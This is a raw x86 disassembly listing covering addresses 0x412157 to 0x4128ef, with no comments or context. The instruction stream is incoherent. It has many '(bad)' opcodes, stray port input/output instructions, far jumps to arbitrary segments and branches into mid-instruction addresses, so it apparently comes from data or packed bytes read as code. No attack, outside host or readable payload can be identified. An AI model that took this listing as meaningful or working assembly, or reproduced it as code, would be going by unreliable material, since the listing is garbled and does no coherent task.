  412157:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412158:	shl    eax,1
  41215a:	mov    ecx,0xf5398aa3
  41215f:	mov    dl,0x6a
  412161:	inc    edi
  412162:	pop    esi
  412163:	cdq    
  412164:	cmp    DWORD PTR [ebp-0xc],edx
  412167:	adc    al,0xef
  412169:	(bad)  
  41216a:	adc    bl,BYTE PTR [esi+ebx*2]
  41216d:	mov    ds:0x4ae148fb,eax
  412172:	retf   0xce76
  412175:	pusha  
  412176:	sub    eax,0x132ecdab
  41217b:	div    DWORD PTR [ecx]
  41217d:	and    ch,bl
  41217f:	adc    ecx,esp
  412181:	xchg   esi,eax
  412182:	jb     0x4121b5
  412184:	rcr    DWORD PTR ds:[ebx-0x2a],1
  412188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412189:	pusha  
  41218a:	es jne 0x412147
  41218d:	leave  
  41218e:	jmp    0x412126
  412190:	mov    ch,0x64
  412192:	add    DWORD PTR [esi-0x26],ebp
  412195:	clc    
  412196:	or     al,BYTE PTR [ecx+0x5d]
  412199:	inc    ecx
  41219a:	sub    esp,DWORD PTR [eax]
  41219c:	inc    ecx
  41219d:	pop    ebx
  41219e:	cs push esp
  4121a0:	adc    DWORD PTR [ebx+0x4b],eax
  4121a3:	out    dx,eax
  4121a4:	repnz pop ecx
  4121a6:	push   es
  4121a7:	cmp    bl,BYTE PTR [ecx+edx*8]
  4121aa:	enter  0xcc5a,0x92
  4121ae:	out    dx,al
  4121af:	adc    BYTE PTR [ebp-0xb439048],0x5d
  4121b6:	jne    0x412159
  4121b8:	mov    bl,0x11
  4121ba:	imul   DWORD PTR [edi-0x17]
  4121bd:	mov    bl,dl
  4121bf:	retf   0xfb5e
  4121c2:	add    BYTE PTR [ebp+0x5],0x55
  4121c6:	push   es
  4121c7:	and    al,0x78
  4121c9:	das    
  4121ca:	(bad)  
  4121cb:	mov    eax,ds:0x9efde3e5
  4121d0:	xor    dh,BYTE PTR [edi+0x37]
  4121d3:	push   ds
  4121d4:	pop    esi
  4121d5:	sub    eax,DWORD PTR [ebp+0x36e32b47]
  4121db:	cmp    BYTE PTR [edx+ebp*1+0x614572b7],al
  4121e2:	mov    cl,0xe1
  4121e4:	nop
  4121e5:	or     eax,0xc1f7c152
  4121ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121eb:	sbb    BYTE PTR [esi-0x2f],0x6d
  4121ef:	aas    
  4121f0:	mov    dl,0x89
  4121f2:	sti    
  4121f3:	jb     0x41219e
  4121f5:	pusha  
  4121f6:	mov    dl,0x5f
  4121f8:	or     al,0xae
  4121fa:	push   0xffffffff
  4121fc:	xchg   ebx,eax
  4121fd:	shr    esi,0xdd
  412200:	xor    cl,BYTE PTR [ecx+0x1e3b041e]
  412206:	and    al,0xa5
  412208:	ins    DWORD PTR es:[edi],dx
  412209:	sub    esi,DWORD PTR [esi]
  41220b:	fwait
  41220c:	outs   dx,BYTE PTR ds:[esi]
  41220d:	mov    eax,ds:0xe11a282e
  412212:	repnz mov al,ds:0xae1d579b
  412218:	loopne 0x412244
  41221a:	cmp    al,0x4a
  41221c:	xor    esi,esp
  41221e:	jmp    0x4121bf
  412220:	add    al,0xae
  412222:	test   ecx,eax
  412224:	xchg   edi,eax
  412225:	and    dh,BYTE PTR [ecx-0x6f]
  412228:	add    ch,BYTE PTR [ebx+edi*1+0x518c5b09]
  41222f:	mov    eax,ds:0xc9af874d
  412234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412235:	mov    eax,0x9d825e40
  41223b:	jbe    0x4121e2
  41223d:	(bad)
  412240:	pop    es
  412241:	popa   
  412242:	jnp    0x412299
  412244:	sub    edx,edi
  412246:	popa   
  412247:	push   ecx
  412248:	mov    edi,0xaf82ee85
  41224d:	dec    ebp
  41224e:	hlt    
  41224f:	aam    0xde
  412251:	adc    al,0x90
  412253:	mov    al,ds:0xb3d8c091
  412258:	pop    ebx
  412259:	adc    DWORD PTR [esi],ebp
  41225b:	sar    edi,1
  41225d:	mov    ecx,esi
  41225f:	clc    
  412260:	pop    esi
  412261:	push   edx
  412262:	or     eax,0xb4dfbc19
  412267:	repz shl DWORD PTR [eax+0x77],0xd3
  41226c:	xor    BYTE PTR [edi],0xd9
  41226f:	pop    edi
  412270:	clc    
  412271:	push   esi
  412272:	bound  esp,QWORD PTR [edx+0x5b]
  412275:	sar    DWORD PTR [ebx-0x53],cl
  412278:	sub    bh,bh
  41227a:	mov    esi,0x564b7d71
  41227f:	mov    eax,ds:0x70858ad8
  412284:	dec    esi
  412285:	pop    edi
  412286:	jle    0x4122e7
  412288:	pop    esi
  412289:	pusha  
  41228a:	push   edi
  41228b:	push   es
  41228c:	inc    edx
  41228d:	xchg   ecx,eax
  41228e:	xchg   edi,esi
  412290:	je     0x4122f2
  412292:	std    
  412293:	(bad)  
  412294:	and    al,0xec
  412296:	and    esi,DWORD PTR [edi]
  412298:	and    al,bh
  41229a:	out    dx,al
  41229b:	adc    al,0x1
  41229d:	dec    esi
  41229e:	cli    
  41229f:	call   0xa1cdab3f
  4122a4:	mov    dl,0xc7
  4122a6:	inc    edi
  4122a7:	sbb    esi,DWORD PTR [ebx-0x42]
  4122aa:	push   es
  4122ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122ac:	pusha  
  4122ad:	outs   dx,BYTE PTR ds:[esi]
  4122ae:	adc    DWORD PTR [ebx+0x61285f05],edx
  4122b4:	mov    ah,BYTE PTR [eax+0x7d26a185]
  4122ba:	(bad)  
  4122bb:	xor    ebp,ebx
  4122bd:	pop    eax
  4122be:	cmp    ebx,edi
  4122c0:	pop    esi
  4122c1:	scas   al,BYTE PTR es:[edi]
  4122c2:	(bad)  
  4122c3:	out    0x65,eax
  4122c5:	cmp    eax,DWORD PTR [ebp-0x21]
  4122c8:	minps  xmm2,XMMWORD PTR [eax+0x5a546409]
  4122cf:	das    
  4122d0:	sahf   
  4122d1:	(bad)  
  4122d2:	xchg   edx,eax
  4122d3:	jmp    0x114a:0x7aef195a
  4122da:	and    ebp,DWORD PTR [edx]
  4122dc:	(bad)
  4122e0:	or     esp,DWORD PTR [ecx-0x48]
  4122e3:	sbb    BYTE PTR ss:[eax-0xca16af4],ch
  4122ea:	out    0x7f,al
  4122ec:	mov    DWORD PTR [edi+edi*2],0xbb5fe952
  4122f3:	sub    BYTE PTR [edx+0x14791541],dl
  4122f9:	popf   
  4122fa:	and    bl,BYTE PTR [esi+ebx*2+0x45]
  4122fe:	outs   dx,DWORD PTR ds:[esi]
  4122ff:	add    ecx,esp
  412301:	mov    edi,DWORD PTR [edx-0x43]
  412304:	mov    bl,0x59
  412306:	adc    DWORD PTR [esp+esi*1],0x31
  41230a:	mov    ecx,0xdfa2bb3f
  41230f:	mov    al,0xa7
  412311:	push   edx
  412312:	push   ebp
  412313:	ret    0xec5e
  412316:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412317:	sbb    ch,BYTE PTR [ebx]
  412319:	fst    st(5)
  41231b:	scas   al,BYTE PTR es:[edi]
  41231c:	xchg   esi,eax
  41231d:	sub    eax,0x4aa4a163
  412322:	or     al,0x11
  412324:	mov    ecx,0x641f513f
  412329:	and    al,0x4
  41232b:	xchg   esp,eax
  41232c:	cmp    ah,BYTE PTR [ecx]
  41232e:	iret   
  41232f:	dec    edi
  412330:	inc    edx
  412331:	ins    BYTE PTR es:[edi],dx
  412332:	fs (bad) 
  412334:	cs xchg esi,eax
  412336:	dec    ebp
  412337:	popa   
  412338:	mov    dl,BYTE PTR [edx+0x3]
  41233b:	mov    ebx,0xeaee2c04
  412340:	xor    DWORD PTR [ebx+ebx*2-0x34493a32],edi
  412347:	sahf   
  412348:	dec    ebp
  412349:	push   0xb4dec19c
  41234e:	inc    ebx
  41234f:	shl    BYTE PTR [edx+ebx*4+0x46708ee],1
  412356:	cmp    DWORD PTR [ebx+0x19],0xe928b487
  41235d:	pusha  
  41235e:	aas    
  41235f:	jmp    0xf7fa:0x249cf501
  412366:	out    dx,al
  412367:	sub    al,0x0
  412369:	loop   0x41235f
  41236b:	fucomp st(6)
  41236d:	inc    eax
  41236e:	push   edi
  41236f:	clc    
  412370:	adc    eax,0x59f6fd61
  412375:	sbb    al,0xfa
  412377:	cmp    esi,eax
  412379:	add    al,0xfc
  41237b:	pop    ebp
  41237c:	mov    dl,0xf4
  41237e:	out    dx,eax
  41237f:	pop    ss
  412380:	outs   dx,BYTE PTR ds:[esi]
  412381:	loopne 0x412347
  412383:	xor    edi,ebp
  412385:	sub    DWORD PTR [ebp-0x5f],ebx
  412388:	(bad)  
  412389:	push   eax
  41238a:	in     eax,dx
  41238b:	mov    ah,0x83
  41238d:	jbe    0x412361
  41238f:	sbb    bl,BYTE PTR [edi-0x7a]
  412392:	and    BYTE PTR [ebx],dl
  412394:	pop    ecx
  412395:	inc    ecx
  412396:	push   esp
  412397:	and    ebp,ebp
  412399:	icebp  
  41239a:	enter  0xe0a0,0x5a
  41239e:	jle    0x41238d
  4123a0:	xchg   ebp,eax
  4123a1:	cmp    edx,DWORD PTR [esi]
  4123a3:	into   
  4123a4:	push   edx
  4123a5:	jno    0x412422
  4123a7:	data16 sahf 
  4123a9:	call   DWORD PTR [esi-0x36]
  4123ac:	or     DWORD PTR [edi+0x51a0a173],esp
  4123b2:	nop
  4123b3:	shl    bh,cl
  4123b5:	inc    esp
  4123b6:	mov    dh,0xee
  4123b8:	pop    ebx
  4123b9:	jmp    0x412375
  4123bb:	xchg   DWORD PTR [edi],ecx
  4123bd:	push   ecx
  4123be:	scas   al,BYTE PTR es:[edi]
  4123bf:	jg     0x412407
  4123c1:	(bad)  
  4123c3:	mov    al,ds:0x18e1cfa8
  4123c8:	push   ds
  4123c9:	mov    ecx,DWORD PTR ds:0x1a95ecd
  4123cf:	(bad)  
  4123d0:	and    eax,0xf9f32175
  4123d5:	push   esp
  4123d6:	test   DWORD PTR [ebx+0x1b],ecx
  4123d9:	xor    eax,0x28edd842
  4123de:	add    BYTE PTR [edx+0x47],ah
  4123e1:	std    
  4123e2:	cmc    
  4123e3:	shl    DWORD PTR [ebx+0x3215edde],1
  4123e9:	rcl    DWORD PTR [esi-0x70],0xce
  4123ed:	pusha  
  4123ee:	clc    
  4123ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123f0:	repz (bad) 
  4123f3:	jmp    0x12a4:0x5bee8e85
  4123fa:	es iret 
  4123fc:	ror    DWORD PTR [esp+esi*8],cl
  4123ff:	sahf   
  412400:	cdq    
  412401:	test   eax,0xc55d9811
  412406:	aad    0xc7
  412408:	dec    esp
  412409:	lods   eax,DWORD PTR ds:[esi]
  41240a:	out    0x61,eax
  41240c:	mov    BYTE PTR ds:0x5fa29ee,ah
  412412:	inc    esp
  412413:	and    bl,BYTE PTR [ebx-0x5d549cf1]
  412419:	ins    DWORD PTR es:[edi],dx
  41241a:	and    eax,esi
  41241c:	arpl   di,di
  41241e:	xchg   ebp,eax
  41241f:	mov    dl,0x3e
  412421:	cmp    al,0xf8
  412423:	ss push ecx
  412425:	add    edi,ebp
  412427:	jl     0x4123c5
  412429:	je     0x4123ad
  41242b:	dec    ebp
  41242c:	gs adc eax,0xf60c88bc
  412433:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412434:	in     eax,0xc8
  412436:	shl    BYTE PTR [eax+0xd],0x17
  41243a:	and    esi,DWORD PTR [ebp+0x31]
  41243d:	pop    edi
  41243e:	aam    0xab
  412440:	loop   0x4124aa
  412442:	push   ecx
  412443:	mov    eax,ds:0x2134f507
  412448:	mov    ebp,0xf7a58b41
  41244d:	aaa    
  41244e:	push   edx
  41244f:	push   ecx
  412450:	push   0x6db4c3a1
  412455:	mov    ebp,esi
  412457:	in     eax,dx
  412458:	f2xm1  
  41245a:	out    0x9c,eax
  41245c:	pop    edi
  41245d:	sahf   
  41245e:	push   ebx
  41245f:	mov    eax,ds:0x4b36bb60
  412464:	stc    
  412465:	dec    edi
  412466:	nop
  412467:	repz pop edi
  412469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41246a:	mov    bl,BYTE PTR ds:0x594ad6c2
  412470:	imul   edx,DWORD PTR [edi+0x7a],0xffffffa1
  412474:	mov    bl,BYTE PTR [eax-0x7bfe80bb]
  41247a:	xchg   ebp,eax
  41247b:	test   al,0x5e
  41247d:	mov    DWORD PTR ds:0xb8a56673,esp
  412483:	stos   DWORD PTR es:[edi],eax
  412484:	xchg   BYTE PTR [eax-0x3a],ah
  412487:	lods   eax,DWORD PTR ds:[esi]
  412488:	mov    ah,0x96
  41248a:	call   0x612c:0xee751fa7
  412491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412492:	mov    ?,esi
  412494:	ins    DWORD PTR es:[edi],dx
  412495:	shr    DWORD PTR [eax+edx*4-0x3f],0x4a
  41249a:	xchg   edx,eax
  41249b:	mov    eax,ds:0x9b9b2bd0
  4124a0:	fdiv   DWORD PTR [edi]
  4124a2:	out    0xdb,eax
  4124a4:	sub    al,0xf6
  4124a6:	add    eax,0xc89bae69
  4124ab:	fnstsw WORD PTR [ebx-0x6b0fcca0]
  4124b1:	fidivr WORD PTR [edi-0x11845abf]
  4124b7:	xchg   BYTE PTR [ebp+0x3f6f11f7],dh
  4124bd:	sbb    BYTE PTR [ebx+0x2793866d],ch
  4124c3:	mov    eax,ds:0xbb819946
  4124c8:	in     al,dx
  4124c9:	mov    al,0xed
  4124cb:	pop    ss
  4124cc:	cs pop ebx
  4124ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124cf:	and    DWORD PTR [edx-0x1b],ebx
  4124d2:	push   ebp
  4124d3:	mov    eax,ds:0x58f69549
  4124d8:	or     edx,ebp
  4124da:	in     al,dx
  4124db:	ficomp WORD PTR [ebx-0x1a]
  4124de:	pusha  
  4124df:	into   
  4124e0:	cmp    al,0x81
  4124e2:	ficomp WORD PTR [esi-0x6]
  4124e5:	scas   eax,DWORD PTR es:[edi]
  4124e6:	add    al,0xa1
  4124e8:	in     al,dx
  4124e9:	int3   
  4124ea:	jecxz  0x412501
  4124ec:	add    DWORD PTR [eax],ebx
  4124ee:	es dec ebp
  4124f0:	jmp    0x568c25ac
  4124f5:	sub    eax,0x202f392e
  4124fa:	sbb    BYTE PTR [ebx+0x64],ch
  4124fd:	and    edi,DWORD PTR [ebp-0x77]
  412500:	ds sbb ebx,ebp
  412503:	sbb    al,0x3d
  412505:	loopne 0x4124f5
  412507:	out    0x49,al
  412509:	adc    eax,0xc84bbea7
  41250e:	outs   dx,BYTE PTR ds:[esi]
  41250f:	mov    eax,ds:0x52313d81
  412514:	enter  0x3cda,0xbe
  412518:	clc    
  412519:	mov    edi,0x8e1656ee
  41251e:	or     bh,bh
  412520:	leave  
  412521:	sub    al,dl
  412523:	mov    al,ds:0x469e6c66
  412528:	mov    ds:0x533659ad,al
  41252d:	std    
  41252e:	sti    
  41252f:	ja     0x41250f
  412531:	arpl   WORD PTR [edi],si
  412533:	cld    
  412534:	pusha  
  412535:	mov    cl,0xa0
  412538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412539:	(bad)  
  41253a:	ins    DWORD PTR es:[edi],dx
  41253b:	and    BYTE PTR [esi+0x5ed191a8],ah
  412541:	ins    BYTE PTR es:[edi],dx
  412542:	push   ebx
  412543:	mov    ds:0xc48933bc,al
  412548:	pop    esp
  412549:	popa   
  41254a:	call   0x7960:0xaf66a1c3
  412551:	pop    es
  412552:	push   eax
  412553:	jae    0x4125b3
  412555:	adc    BYTE PTR [ebp+0x1b007474],ch
  41255b:	xor    cl,BYTE PTR [ebx-0x145d9b18]
  412561:	sbb    DWORD PTR [bx+si],esp
  412564:	scas   al,BYTE PTR es:[edi]
  412565:	push   cs
  412566:	xchg   ebx,eax
  412567:	popa   
  412568:	xor    al,BYTE PTR [ecx-0x7cf80612]
  41256e:	or     dl,BYTE PTR [ecx]
  412570:	imul   edi,DWORD PTR [edi],0xffffff8c
  412573:	mov    eax,ds:0xa2f71e8d
  412578:	out    dx,al
  412579:	(bad)  
  41257a:	jmp    0x551879a7
  41257f:	sti    
  412580:	pop    esi
  412581:	add    eax,0x304a58ad
  412586:	sub    esp,DWORD PTR [ecx+0x2d051ac9]
  41258c:	xchg   esi,eax
  41258d:	call   0xf89b:0xb13c5316
  412594:	pop    esi
  412595:	add    BYTE PTR [eax+0x2bbb6d7b],0xa1
  41259c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41259d:	loope  0x412562
  41259f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125a0:	popf   
  4125a1:	sub    BYTE PTR [edi+0x63],bh
  4125a4:	xchg   BYTE PTR [ecx],dl
  4125a6:	out    dx,al
  4125a7:	jge    0x41252c
  4125a9:	out    dx,eax
  4125aa:	stos   BYTE PTR es:[edi],al
  4125ab:	(bad)  
  4125ac:	call   0xbc2a4fb3
  4125b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125b2:	xchg   ecx,eax
  4125b3:	mov    eax,ds:0xca6e19b
  4125b8:	pop    ds
  4125b9:	lods   al,BYTE PTR ds:[esi]
  4125ba:	sub    ecx,DWORD PTR [esi]
  4125bc:	pop    esi
  4125bd:	and    eax,DWORD PTR [ebx+0x7c]
  4125c0:	in     al,0x7d
  4125c2:	stc    
  4125c3:	sub    eax,0xadb35a51
  4125c8:	ins    BYTE PTR es:[edi],dx
  4125c9:	xchg   ebx,eax
  4125ca:	mov    bh,0x10
  4125cc:	popa   
  4125cd:	into   
  4125ce:	push   edi
  4125cf:	in     al,0x5b
  4125d1:	xchg   ebx,eax
  4125d2:	push   ecx
  4125d3:	sbb    al,0xdb
  4125d5:	add    al,0xfd
  4125d7:	jno    0x412640
  4125d9:	outs   dx,DWORD PTR ds:[esi]
  4125da:	in     al,0x40
  4125dc:	xchg   edi,eax
  4125dd:	ss push eax
  4125df:	imul   ebx,DWORD PTR [esi-0x2e],0xffffffda
  4125e3:	scas   eax,DWORD PTR es:[edi]
  4125e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125e5:	xchg   esi,eax
  4125e6:	je     0x41264e
  4125e8:	test   eax,0xecc2fa60
  4125ed:	clc    
  4125ee:	mov    cl,0xc7
  4125f0:	mov    esi,0xe40bf01a
  4125f5:	icebp  
  4125f6:	fisub  DWORD PTR [edi-0xd]
  4125f9:	in     eax,dx
  4125fa:	mov    esi,0xa2556cf0
  4125ff:	mov    eax,ds:0xfafd6e4a
  412604:	test   eax,0xef223201
  412609:	in     al,dx
  41260a:	out    dx,al
  41260b:	ins    BYTE PTR es:[edi],dx
  41260c:	test   BYTE PTR [ebx+0x44093052],dl
  412612:	mov    BYTE PTR [ebx+0x2f3fae2e],ah
  412618:	(bad)  
  412619:	(bad)  
  41261b:	call   0xec79:0xf0cbeda5
  412622:	and    ebx,ebp
  412624:	jb     0x412686
  412626:	push   ebp
  412627:	push   esi
  412628:	jmp    0x5c3b9989
  41262d:	popa   
  41262e:	add    BYTE PTR [esi-0x750ec2ca],cl
  412634:	shl    ebp,cl
  412636:	out    dx,al
  412637:	mov    ds:0x48884928,al
  41263c:	push   DWORD PTR [ebp-0x126d729d]
  412642:	pop    esi
  412643:	mov    eax,ds:0x46933250
  412648:	fdivr  DWORD PTR [eax-0x10]
  41264b:	bound  ecx,QWORD PTR [ebp-0x58bed1c5]
  412651:	mov    eax,ds:0x60eaf69d
  412656:	cli    
  412657:	out    dx,eax
  412658:	mov    ds:0x5466bb1a,al
  41265d:	xchg   dh,cl
  41265f:	imul   DWORD PTR [edx]
  412661:	add    eax,0x6113e0f7
  412666:	in     al,dx
  412667:	mov    WORD PTR [ebp-0x26],?
  41266a:	mov    esp,DWORD PTR [ecx-0x4c]
  41266d:	mov    bl,0x25
  41266f:	pop    esp
  412670:	push   ecx
  412671:	popa   
  412672:	cmp    DWORD PTR [ecx-0x55],edi
  412675:	inc    eax
  412676:	nop
  412677:	jo     0x4126e6
  412679:	pusha  
  41267a:	call   0x77604f56
  41267f:	cwde   
  412680:	xchg   esi,eax
  412681:	dec    eax
  412682:	out    dx,eax
  412683:	int    0x8f
  412685:	and    BYTE PTR [ecx],dl
  412687:	inc    ecx
  412688:	stos   BYTE PTR es:[edi],al
  412689:	xor    BYTE PTR [ebp+0x306127b6],dh
  41268f:	xchg   esp,eax
  412690:	jl     0x41270b
  412692:	jbe    0x4126bb
  412694:	scas   al,BYTE PTR es:[edi]
  412695:	and    esp,DWORD PTR [esp+ebp*4+0x4a]
  412699:	in     al,0x28
  41269b:	add    DWORD PTR [ebp+0x44],esi
  41269e:	xchg   ecx,eax
  41269f:	lahf   
  4126a0:	pop    esi
  4126a1:	sub    eax,0x683b5543
  4126a6:	inc    ecx
  4126a7:	lock xchg DWORD PTR [eax+0x22],esp
  4126ab:	pop    es
  4126ac:	push   0x7c
  4126ae:	mov    ecx,0xeed80615
  4126b3:	shr    BYTE PTR ds:0x7b217bb5,cl
  4126b9:	or     al,0x19
  4126bb:	mov    eax,ds:0xe2e6b43f
  4126c0:	inc    esp
  4126c1:	pop    esp
  4126c2:	sar    eax,0x63
  4126c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126c6:	lds    ebp,FWORD PTR [eax-0x2c629ea5]
  4126cc:	or     ebp,eax
  4126ce:	mov    dh,0xa0
  4126d0:	ret    0xff10
  4126d3:	mov    al,0x7b
  4126d5:	test   eax,0x855e5149
  4126da:	push   ss
  4126db:	stos   BYTE PTR es:[edi],al
  4126dc:	cmp    al,0x13
  4126de:	mov    bl,BYTE PTR [ebx+0xffe6156]
  4126e4:	xlat   BYTE PTR ds:[ebx]
  4126e5:	adc    BYTE PTR [ebx],cl
  4126e7:	(bad)  
  4126e8:	out    0x36,eax
  4126ea:	out    dx,al
  4126eb:	and    DWORD PTR [edi],0x489275b3
  4126f1:	repz xchg edx,eax
  4126f3:	mov    eax,ds:0x622a511b
  4126f8:	mov    al,0xf5
  4126fa:	sbb    eax,0xd0755e95
  4126ff:	shr    DWORD PTR [ebp-0x2a015ef7],1
  412705:	push   edx
  412706:	out    0xe6,al
  412708:	mov    BYTE PTR [edi],dh
  41270a:	push   cs
  41270b:	pop    ebx
  41270c:	sub    DWORD PTR [eax+0x22],edx
  41270f:	push   cs
  412710:	pop    esi
  412711:	sbb    bl,BYTE PTR [ecx+0x48]
  412714:	xchg   DWORD PTR [esi+ecx*1-0x144f8f65],edi
  41271b:	mov    al,ds:0x32215423
  412720:	mov    WORD PTR [edx+ebx*4+0x9105ebe],fs
  412727:	and    DWORD PTR [esi],esp
  412729:	clc    
  41272a:	cld    
  41272b:	or     eax,0x2cf8612b
  412730:	in     al,dx
  412731:	mov    ebx,DWORD PTR [ebx+0x17]
  412734:	pusha  
  412735:	and    al,0xee
  412737:	inc    esi
  412738:	ficomp DWORD PTR [edi-0x61]
  41273b:	jae    0x41274d
  41273d:	push   edi
  41273e:	les    esp,FWORD PTR [eax+0x138474c0]
  412744:	call   0x258:0x823b96a6
  41274b:	sub    al,0xfb
  41274d:	and    dh,ch
  41274f:	inc    esp
  412750:	push   es
  412751:	sub    BYTE PTR [ecx+0x7a],dl
  412754:	mov    ds:0x5a08f60,eax
  412759:	rol    DWORD PTR [ecx],1
  41275b:	popa   
  41275c:	call   DWORD PTR [edi-0x378a1212]
  412762:	cmp    al,0xf7
  412764:	std    
  412765:	popa   
  412766:	icebp  
  412767:	mov    al,ds:0xc4b4e11d
  41276c:	cmc    
  41276d:	jg     0x41275f
  41276f:	mov    bl,0x78
  412771:	outs   dx,DWORD PTR ds:[esi]
  412772:	out    dx,al
  412773:	dec    ebp
  412774:	mov    ch,0xaf
  412776:	push   cs
  412777:	xchg   esi,eax
  412778:	aaa    
  412779:	mov    ds:0x4f24a0d7,al
  41277e:	mov    al,ds:0xa376589b
  412783:	es pop esi
  412785:	or     bl,ah
  412787:	mov    bl,0x38
  412789:	jo     0x4127cf
  41278b:	mov    ecx,0x23547ab3
  412790:	inc    ecx
  412791:	popa   
  412792:	shr    dh,0x9e
  412795:	dec    eax
  412796:	pushf  
  412797:	jae    0x4127cf
  412799:	aaa    
  41279a:	mov    dl,0x6c
  41279c:	pop    ecx
  41279d:	call   0x24e8930a
  4127a2:	sub    esi,DWORD PTR ds:0x318cde5a
  4127a8:	lods   al,BYTE PTR ds:[esi]
  4127a9:	inc    ecx
  4127aa:	scas   eax,DWORD PTR es:[edi]
  4127ab:	mov    eax,ds:0x3f6aee9f
  4127b0:	aam    0x2b
  4127b2:	sub    eax,0xee289185
  4127b7:	xor    BYTE PTR [eiz*2-0x4d3afd5a],bh
  4127be:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127c0:	cmp    BYTE PTR [ebx],dl
  4127c2:	(bad)  [ecx+0x394eb11b]
  4127c8:	mov    bl,0x47
  4127ca:	in     eax,dx
  4127cb:	push   0xffffffbd
  4127cd:	je     0x4127f6
  4127cf:	clc    
  4127d0:	les    esp,FWORD PTR [edi+0x519c4c4a]
  4127d6:	ficomp DWORD PTR [edx+edx*1+0x7d13470c]
  4127dd:	loopne 0x41283d
  4127df:	push   eax
  4127e0:	and    esp,DWORD PTR [edi]
  4127e2:	out    dx,al
  4127e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127e4:	pop    ebp
  4127e5:	mov    DWORD PTR [eax+0x53],edx
  4127e8:	push   edx
  4127e9:	imul   esi,DWORD PTR [eax+eiz*4-0xf191d05],0xffffffc0
  4127f1:	sbb    eax,0x7244909b
  4127f6:	add    al,0xb2
  4127f8:	push   ebx
  4127f9:	outs   dx,BYTE PTR ds:[esi]
  4127fa:	loop   0x4127e7
  4127fc:	pop    esi
  4127fd:	dec    ebx
  4127fe:	rcr    DWORD PTR [eax-0x2f975e07],1
  412804:	xor    BYTE PTR [edx-0x4c],cl
  412807:	pop    edi
  412808:	pushf  
  412809:	pop    edi
  41280a:	mov    ds:0x4e2b5476,al
  41280f:	dec    ecx
  412810:	out    dx,al
  412811:	addr16 out dx,al
  412813:	jl     0x41284e
  412815:	adc    DWORD PTR [edi],esi
  412817:	push   edi
  412818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412819:	ret    
  41281a:	es test al,0x11
  41281d:	sub    eax,0xa15b7f5b
  412822:	pop    ecx
  412823:	sbb    esp,DWORD PTR [eax-0x26]
  412826:	neg    DWORD PTR [ebx]
  412828:	and    eax,0x4bf7eec0
  41282d:	cmp    eax,0x6075901a
  412832:	clc    
  412833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412834:	mov    edx,0x1d8835cf
  412839:	cld    
  41283a:	add    DWORD PTR ds:0xa260580c,ecx
  412840:	je     0x412855
  412842:	sbb    al,0x91
  412844:	xchg   edi,eax
  412845:	pop    eax
  412846:	pop    esi
  412847:	jle    0x412817
  412849:	pusha  
  41284a:	jp     0x4127ce
  41284c:	in     eax,dx
  41284d:	aas    
  41284e:	shl    DWORD PTR [esi+esi*8],1
  412851:	inc    edx
  412852:	jmp    0x4128ad
  412854:	ins    BYTE PTR es:[edi],dx
  412855:	(bad)  
  412856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412857:	pop    esp
  412858:	fidivr DWORD PTR [eax+0x615d4e69]
  41285e:	adc    bl,ch
  412860:	loopne 0x412833
  412862:	push   es
  412863:	mov    ch,0xc1
  412865:	loope  0x412844
  412867:	sbb    eax,0x5af28652
  41286c:	pop    ebp
  41286d:	stos   BYTE PTR es:[edi],al
  41286e:	not    BYTE PTR [eax]
  412870:	ds ds into 
  412873:	push   esp
  412874:	push   ebx
  412875:	popa   
  412876:	pop    ss
  412877:	test   al,0x59
  412879:	mov    dl,0xe2
  41287b:	xchg   edx,eax
  41287c:	lea    eax,[edx-0x60420312]
  412882:	or     al,0x77
  412884:	leave  
  412885:	add    al,0x32
  412887:	mov    eax,ds:0xe1fe9356
  41288c:	fistp  WORD PTR [edx+0x7e5e5255]
  412892:	push   esi
  412893:	sti    
  412894:	outs   dx,DWORD PTR ds:[esi]
  412895:	cs push ecx
  412897:	sub    BYTE PTR [ecx+0x35e33f51],dl
  41289d:	add    al,0x8e
  41289f:	mov    ecx,0x1e40e844
  4128a4:	inc    edx
  4128a5:	test   BYTE PTR [esi-0x3126a27c],0xce
  4128ac:	xor    dh,BYTE PTR [eax+0x32]
  4128af:	xchg   esp,eax
  4128b0:	push   ecx
  4128b1:	popa   
  4128b2:	mov    bh,0x9f
  4128b4:	xchg   ebp,eax
  4128b5:	(bad)  
  4128b6:	gs out dx,eax
  4128b8:	dec    DWORD PTR [ebx-0x19]
  4128bb:	dec    ebx
  4128bc:	or     BYTE PTR [esi+0x5afee4b2],ah
  4128c2:	pop    edi
  4128c3:	setp   BYTE PTR [eax-0x7b]
  4128c7:	add    eax,0x16de7804
  4128cc:	xlat   BYTE PTR ds:[ebx]
  4128cd:	inc    ebx
  4128ce:	out    dx,al
  4128cf:	pop    edx
  4128d0:	pop    ds
  4128d1:	nop
  4128d2:	and    esi,eax
  4128d4:	jae    0x4128d8
  4128d6:	scas   al,BYTE PTR es:[edi]
  4128d7:	mov    al,ds:0x9ac1d6ff
  4128dc:	bound  ebp,QWORD PTR [ebp+0x2d]
  4128df:	in     al,dx
  4128e0:	pop    esi
  4128e1:	(bad)  
  4128e2:	js     0x4128e1
  4128e4:	fsub   QWORD PTR [edx-0xd]
  4128e7:	cmc    
  4128e8:	enter  0x6459,0x82
  4128ec:	jg     0x41291f
  4128ee:	cdq    
  4128ef:	inc    ecx
